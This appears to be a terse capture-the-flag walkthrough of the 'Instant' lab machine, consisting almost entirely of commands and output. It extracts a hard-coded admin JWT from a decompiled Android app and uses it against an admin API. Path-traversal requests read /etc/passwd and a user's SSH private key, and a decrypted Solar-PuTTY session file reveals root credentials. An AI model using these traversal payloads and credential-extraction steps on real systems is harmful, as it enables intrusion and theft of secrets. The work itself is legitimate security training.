


```
/* loaded from: classes.dex */
public class AdminActivities {
    private String TestAdminAuthorization() {
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
            static final /* synthetic */ boolean $assertionsDisabled = false;

            @Override // okhttp3.Callback
            public void onFailure(Call call, IOException iOException) {
                System.out.println("Error Here : " + iOException.getMessage());
            }

            @Override // okhttp3.Callback
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        System.out.println(JsonParser.parseString(response.body().string()).getAsJsonObject().get("username").getAsString());
                    } catch (JsonSyntaxException e) {
                        System.out.println("Error Here : " + e.getMessage());
                    }
                }
            }
        });
        return "Done";
    }
}
```


```
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb
        </domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb
        </domain>
    </domain-config>
</network-security-config>
```



```json
kali@kali ~> curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/list/users" -H  "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" > insatnt.json
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   349  100   349    0     0   2436      0 --:--:-- --:--:-- --:--:--  2457
kali@kali ~> cat insatnt.json | jq
{
  "Status": 200,
  "Users": [
    {
      "email": "admin@instant.htb",
      "role": "Admin",
      "secret_pin": 87348,
      "status": "active",
      "username": "instantAdmin",
      "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
    },
    {
      "email": "shirohige@instant.htb",
      "role": "instantian",
      "secret_pin": 42845,
      "status": "active",
      "username": "shirohige",
      "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11"
    }
  ]
}

```


```
kali@kali ~> curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/view/logs" -H  "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
{"Files":["1.log"],"Path":"/home/shirohige/logs/","Status":201}
```

```json
kali@kali ~> curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/list/users" -H  "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
{"Status":200,"Users":[{"email":"admin@instant.htb","role":"Admin","secret_pin":87348,"status":"active","username":"instantAdmin","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},{"email":"shirohige@instant.htb","role":"instantian","secret_pin":42845,"status":"active","username":"shirohige","wallet_id":"458715c9-b15e-467b-8a3d-97bc3fcf3c11"}]}
kali@kali ~> curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/list/users" -H  "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" > insatnt.json
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   349  100   349    0     0   2436      0 --:--:-- --:--:-- --:--:--  2457
kali@kali ~> cat insatnt.json | jq
{
  "Status": 200,
  "Users": [
    {
      "email": "admin@instant.htb",
      "role": "Admin",
      "secret_pin": 87348,
      "status": "active",
      "username": "instantAdmin",
      "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
    },
    {
      "email": "shirohige@instant.htb",
      "role": "instantian",
      "secret_pin": 42845,
      "status": "active",
      "username": "shirohige",
      "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11"
    }
  ]
}

```


LFI

```
kali@kali ~> curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../..//etc/passwd" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
{"/home/shirohige/logs/../../../..//etc/passwd":["root:x:0:0:root:/root:/bin/bash\n","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n","bin:x:2:2:bin:/bin:/usr/sbin/nologin\n","sys:x:3:3:sys:/dev:/usr/sbin/nologin\n","sync:x:4:65534:sync:/bin:/bin/sync\n","games:x:5:60:games:/usr/games:/usr/sbin/nologin\n","man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n","lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n","mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n","news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n","uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n","proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n","www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n","backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n","list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n","irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n","_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n","nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n","systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n","systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n","dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n","messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n","systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n","pollinate:x:102:1::/var/cache/pollinate:/bin/false\n","polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n","usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n","sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n","shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n","_laurel:x:999:990::/var/log/laurel:/bin/false\n"],"Status":201}

```


```
kali@kali ~> curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../home/shirohige/.ssh/id_rsa" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
{"/home/shirohige/logs/../../../../../home/shirohige/.ssh/id_rsa":["-----BEGIN RSA PRIVATE KEY-----\n","MIIEowIBAAKCAQEAvAUzcjGlOJInYuW4egGx6XlrBvCMPhWQAqoldj5zF8urYFQY\n","+J+IGs1Kk6OzBgSdevfgvJJSqGDQs0z4//+4112WI7Tce62RuVXcr9ANnAsCMM8P\n","pc3Bvk2He8LIgIzjNSDk9afSkImxXR26lipHqZvIq18ixE7vbwrMOUcwa57LaZJb\n","iDY8kHqRqCW54OY1RXhFw8qB0benu8xn/oBPolwgwsDyrjkdoYe0ysDyVN74UYRS\n","/ilh6xJ+//LWedXDpu0jjLDKF90vcZI9r97t0XMCZx6BMr/f+6BofvCjvAnazgcQ\n","+Zx2aLxh0sDCaWKqU9IEWGBkLie13uMzYZ+mfQIDAQABAoIBAAMP+BctSvX9SY5X\n","HMiXrRMwqsg7p161xFTw6YL1OcTfe9wQXULS4U12uBCbeZjCVGr6BKgoShfD66ef\n","b1xHAG4oPOZtHgEF0yKx4jiJ7N9a8NA6GlkK5csuEkpqUSGkeuChwBfd8MvPJP1v\n","gY6Yx+VtewnPQbU1kJdCc2WPTNduAQI9wSCLHw8XJjE9zIuuU7zGJxnY5PPihlav\n","edl99lciTGg+ADKpcx8l6WntOnvDw4HX+vsfg4946RI/8R0HtIO3Fc6kcEwMJMVY\n","vSxlIw45WkPeSd/0JJyIZcpk1JB2hpu39rauhb9a2O7klIdWTGhVkWSRM56+uBXm\n","++TtEUECgYEA8fwqtT1fkRDVcgqdCus3bQYzdKWXt528w7De/M76BPs5ceY3qqOB\n","wTQbTm898hTETlak3mi96OVPO9L+OnNrRQohyVST2FD4IGt04czpixUbpMIlVqdF\n","RCMmFdtAeyz+EwIs2ISJf6qrQ+BP8xaC9pdi0lWTHrWU18jXdaC5Lp0CgYEAxujq\n","vSwjEge0jG1rJ+CqFc6fyA97auytPKofGkJtmwcrTInTZwtmfLNlqW2TnFDdYwNh\n","uU83K5ftvc0Pr9VkCl8Dy2MimEzy2jVLXnn90s77XtrDAsFbHqlRSmpVEu2MaCqX\n","TxQB11SZkuKkDEB04VHH6LoozPZgvHkgP1Bh4WECgYBcGwBihd7HR6IGy1VlH4y0\n","OcUCJDlwUWDVF5B4p4tws/L0kI0lrSCpWlz+aMcqSo9Bxibw5OtMJ2QWQEQ2GVJ+\n","L9IWYNP5ZTBcnqoZfDZ0ku83shImPnrV6Y8IiLCtcb2vnIdXTnNLnbmcl1e3Dh2B\n","ILQjnSDncnQaAj9IbYmu3QKBgBp7Jc07lAuxdOsBIjPz6BDxKjqDPSYWDlY2O9/O\n","GjN6d9w/uSJN1T4i0BUHXpB//4lQCPGXxzuJhYAwTbdWDHSJA8NPFmr6S5abY8ZX\n","LWCkZ7jQHQg/37asSgNDNsJHV9sCWJSRkFEvlSaF/9sVtbnNnnSwXAA1iNlusslb\n","FTzhAoGBAKRB25zMd3l6QvLg+6CzWsjW4s8MHW8nrieZ3AEL2SevhLVOHGtqUyD1\n","ARiI8URIxk6HYjGMtEh1RuCBMm98ayHLHov8951iiHMezxAXyYG/4XfEJU7HzvIw\n","USZ9BiztUSXlWz/B7svlBit8ZLxLJbc5DOS7UvLSWD3oA2r2qDNd\n","-----END RSA PRIVATE KEY-----\n"],"Status":201}

```


```
drwxr-xr-x 5 shirohige shirohige  4096 Oct  4 15:22 .
drwxr-xr-x 4 shirohige shirohige  4096 Oct  4 15:22 ..
-rw-r--r-- 1 shirohige shirohige    71 Aug  8 19:34 .env
drwxrwxr-x 2 shirohige shirohige  4096 Oct  4 15:22 __pycache__
-rw-r--r-- 1 shirohige shirohige 13255 Oct  2 11:02 app.py
drwxr-xr-x 2 shirohige shirohige  4096 Oct  4 15:22 instance
-rw-r--r-- 1 shirohige shirohige  2231 Jul 21 22:13 models.py
-rw-r--r-- 1 shirohige shirohige   584 Aug  2 15:43 requirements.txt
-rw-r--r-- 1 shirohige shirohige 25488 Oct  4 10:50 serve.py
drwxr-xr-x 2 shirohige shirohige  4096 Oct  4 15:22 swagger_configs
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet$ cat .env
SECRET_KEY=VeryStrongS3cretKeyY0uC4NTGET

```


```
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```


https://github.com/Wind010/SolarPuttyDecryptor




```
✔ Correct password found on line 103:  estrella
🚀🚀🚀🚀🚀
{
    "Sessions": [
        {
            "Id": "066894ee-635c-4578-86d0-d36d4838115b",
            "Ip": "10.10.11.37",
            "Port": 22,
            "ConnectionType": 1,
            "SessionName": "Instant",
            "Authentication": 0,
            "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
            "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
            "LastTimeOpen": "0001-01-01T00:00:00",
            "OpenCounter": 1,
            "SerialLine": null,
            "Speed": 0,
            "Color": "#FF176998",
            "TelnetConnectionWaitSeconds": 1,
            "LoggingEnabled": false,
            "RemoteDirectory": ""
        }
    ],
    "Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "12**24nzC!r0c%q12",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
    ],
    "AuthScript": [],
    "Groups": [],
    "Tunnels": [],
    "LogsFolderDestination": "C:__ProgramData__SolarWinds__Logs__Solar-PuTTY__SessionLogs"
}

```



gg ez
used 2 hints 